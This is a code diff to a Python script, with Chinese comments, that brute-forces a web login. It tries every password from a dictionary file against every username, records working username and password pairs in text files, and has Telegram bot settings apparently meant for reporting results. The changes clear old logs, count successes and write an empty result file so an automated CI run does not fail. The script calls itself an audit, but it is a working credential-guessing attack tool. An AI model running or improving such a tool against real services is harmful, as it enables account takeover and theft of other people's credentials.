@@ -7,7 +7,7 @@ USER_FIELD = "email"
 PWD_FIELD = "password"
 REQUEST_INTERVAL = 1.0
 RESULT_FILE_PATH = "success_log.txt"
-SUMMARY_TXT_PATH = "success_summary.txt"  # 打包整理后的TXT文件
+SUMMARY_TXT_PATH = "success_summary.txt"
 
 # ==================== Telegram 配置 ====================
 TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "")
@@ -55,7 +55,7 @@ def log_success(username, password):
     with open(RESULT_FILE_PATH, "a", encoding="utf-8") as f:
         f.write(f"[{current_time}] 成功: 账号={username} ---- 密码={password}\n")
         
-    # 2. 写入打包整理好的 TXT 文件（格式化排版）
+    # 2. 追加写入整理好的 TXT 文件
     with open(SUMMARY_TXT_PATH, "a", encoding="utf-8") as f:
         f.write(f"账号: {username} | 密码: {password} | 时间: {current_time}\n")
         
@@ -91,12 +91,15 @@ def main():
         print("[!] 错误：未找到有效的账号字典(users.txt)或密码字典(passwords.txt)！")
         return
 
-    # 每次运行前清空旧的汇总TXT（可选，避免重复累加）
-    if os.path.exists(SUMMARY_TXT_PATH):
-        os.remove(SUMMARY_TXT_PATH)
+    # 运行前清理旧的汇总文件
+    for path in [RESULT_FILE_PATH, SUMMARY_TXT_PATH]:
+        if os.path.exists(path):
+            os.remove(path)
 
     print(f"[*] 全自动审计开始，共 {len(usernames)} 个账号，{len(passwords)} 个密码")
     print(f"[*] 目标: {LOGIN_URL}\n")
+
+    success_count = 0
 
     with requests.Session() as session:
         for username in usernames:
@@ -117,6 +120,7 @@ def main():
                     if is_login_success(response):
                         print(f"\n[+] 【找到正确密码】 {username} -> {password}")
                         log_success(username, password)
+                        success_count += 1
                         found = True
                         break
                 except requests.exceptions.RequestException as e:
@@ -127,7 +131,12 @@ def main():
             if not found:
                 print(f"[-] 账号 {username} 未找到正确密码")
 
-    print("\n[*] 全自动审计结束，所有账号已处理完毕。")
+    # 【保险机制】如果整轮跑下来没有任何成功记录，也强制生成一个空结果TXT，防止Actions上传报错
+    if not os.path.exists(SUMMARY_TXT_PATH):
+        with open(SUMMARY_TXT_PATH, "w", encoding="utf-8") as f:
+            f.write(f"审计完成时间: {time.strftime('%Y-%m-%d %H:%M:%S')} - 本次未发现有效凭据或未成功匹配。\n")
+
+    print(f"\n[*] 全自动审计结束，所有账号已处理完毕。成功找到 {success_count} 个有效凭据。")
 
 if __name__ == "__main__":
     main()
